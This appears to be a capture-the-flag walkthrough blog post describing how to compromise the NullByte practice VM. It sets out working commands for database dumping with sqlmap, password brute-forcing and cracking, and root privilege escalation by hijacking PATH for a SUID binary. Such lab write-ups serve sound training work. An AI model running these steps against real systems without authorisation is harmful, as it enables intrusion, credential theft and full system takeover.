@@ -1,0 +1,431 @@
+
+								
+																		Hack the NullByte VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 27, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									This is our article on root2boot penetration testing challenge. We will walk through an exploitable framework of NullByte VM. Breaking into it isn’t too difficult. There isn’t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate. We have to find “Proof.txt” and follow further steps. You can download it from here.
+Penetrating Methodology:
+
+Network Scanning (Nmap, netdiscover)
+Exacting hidden text from an image(ExifTool)
+Dictionary Attack using rockyou.txt(Burp suite)
+Steal Database information via SQL injection (Sqlmap)
+Login to SSH
+Find SUID Binaries
+Privilege Escalation by Manipulating $PATH
+Get Root access and capture the flag.
+
+Let’s Begin the Game!!!
+ Start off by finding your target by running netdiscover on the terminal of the attacking machine.
+
+Our target is 192.168.1.142. And now that we know our target, we will scan it using nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.142
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.142
+					
+				
+			
+		
+
+
+Scanning the IP, we will know that the port number 80, 111, 777, 44607 are open. Please observe here that the service of SSH is forwarded from 22 to 777 port. This port may come in handy in the future to gain access.
+Now we will try and open the targeted IP in the browser.
+
+ 
+There are an image and a quote on the page. You will find nothing on the page source or otherwise. But there might be something hidden in the image and so, we will read the image using EXIF tool, therefore, download this image.
+
+		
+		
+			
+			
+			
+			
+exiftool main.gif
+			
+				
+					
+				
+					1
+				
+						exiftool main.gif
+					
+				
+			
+		
+
+
+There you will find a comment kzMb5nVYJw. Now this might be a directory and there is no harm in opening it the browser so let’s do that
+
+Our assumption was right as it opened in the browser. But it is asking for a key. And we have no idea what the key is so, therefore, we will use the dictionary attack to find the key using BurpSuite and rockyou.txt. Through the dictionary attack, you will find the key i.e. elite.
+
+Through the dictionary attack, you will find the key i.e. elite. Enter the key where it was asking and the new web page will get opened which will be asking for username, BUT this time also we do not know the username. So, we will find it in its Database using sqlmap. And for this type:
+
+		
+		
+			
+			
+			
+			
+sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1 --dbs --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1 --dbs --batch
+					
+				
+			
+		
+
+
+It will give you the name of the database i.e. seth.  
+
+Now further we will find columns and tables and for that type:
+
+		
+		
+			
+			
+			
+			
+sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth --dump-all --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u http://192.168.1.142/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth --dump-all --batch
+					
+				
+			
+		
+
+Once command executes, it will show you the table name along with column and password as shown:
+ 
+As a result, we have username and password but the password is in MD5 so we need to crack it and there are many online tools to do so. Therefore to crack it go to md5coder.org and give the md5 value there and click on ok and it will show you the original word i.e. omega
+
+Now we will SSH to log in and for that type:
+
+		
+		
+			
+			
+			
+			
+ssh ramses@192.168.1.142 -p 777
+			
+				
+					
+				
+					1
+				
+						ssh ramses@192.168.1.142 -p 777
+					
+				
+			
+		
+
+And then give omega as the password. And you are logged in. As you are now logged in type the following command to see the list of directories:
+Then by using the following command, you can enumerate all binaries having SUID permission.
+
+		
+		
+			
+			
+			
+			
+find / -perm -u=s -type f 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -u=s -type f 2&gt;/dev/null
+					
+				
+			
+		
+
+We found that SUID bit enabled for /var/www/backup/procwatch which was quite attention-grabbing. So we decide to explore it for further steps.
+
+
+		
+		
+			
+			
+			
+			
+cd /var/www/bakcup/
+./procwatch
+			
+				
+					
+				
+					12
+				
+						cd /var/www/bakcup/./procwatch
+					
+				
+			
+		
+
+So when I run the above command, it looks like the procwatch file is trying to run ps and this is a genuine file inside /bin for Process status. The most important things which could be considered here that the author has set SUID bit ON for procwatch and might be it could be any small program file which is calling system function such as ps.
+Taking its advantage, we can escalate the root privilege and hit the goal of this VM. To achieve this we will have to manipulate the environment PATH variable. If we can get procwatch to run sh instead of ps, it should give us a root shell. Following techniques is called Linux Privilege escalation using environment $PATH variable and their so many methods to manipulate environment variable.
+1st Method
+
+
+		
+		
+			
+			
+			
+			
+echo "/bin/sh"  &gt; ps
+chmod 777 ps
+echo $PATH
+export PATH=.:$PATH
+echo $PATH
+./procwatch
+			
+				
+					
+				
+					123456
+				
+						echo "/bin/sh"  &gt; pschmod 777 psecho $PATHexport PATH=.:$PATHecho $PATH./procwatch
+					
+				
+			
+		
+
+Due to ‘.’ in $PATH means that the user is able to execute binaries/scripts from the current directory. With us execution of above commands we will enter root and then further type ;
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+ls
+cat proof.txt
+			
+				
+					
+				
+					1234
+				
+						idcd /rootlscat proof.txt
+					
+				
+			
+		
+
+
+2nd Method 
+
+
+		
+		
+			
+			
+			
+			
+cp /bin/sh /tmp/ps
+echo $PATH
+export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+./procwatch
+			
+				
+					
+				
+					1234
+				
+						cp /bin/sh /tmp/psecho $PATHexport PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games./procwatch
+					
+				
+			
+		
+
+With us execution of above commands we will enter root and then further type ;
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+ls
+cat proof.txt
+			
+				
+					
+				
+					1234
+				
+						idcd /rootlscat proof.txt
+					
+				
+			
+		
+
+
+3rd Method
+vi ps
+Once vi editors get open type /bin/sh and save the file.
+
+
+		
+		
+			
+			
+			
+			
+chmod 777 ps
+echo $PATH
+export PATH=.:$PATH
+cd /var/www/backup
+./procwatch
+			
+				
+					
+				
+					12345
+				
+						chmod 777 psecho $PATHexport PATH=.:$PATHcd /var/www/backup./procwatch
+					
+				
+			
+		
+
+With us execution of above commands we will enter root and then further type ;
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+ls
+cat proof.txt
+			
+				
+					
+				
+					1234
+				
+						idcd /rootlscat proof.txt
+					
+				
+			
+		
+
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
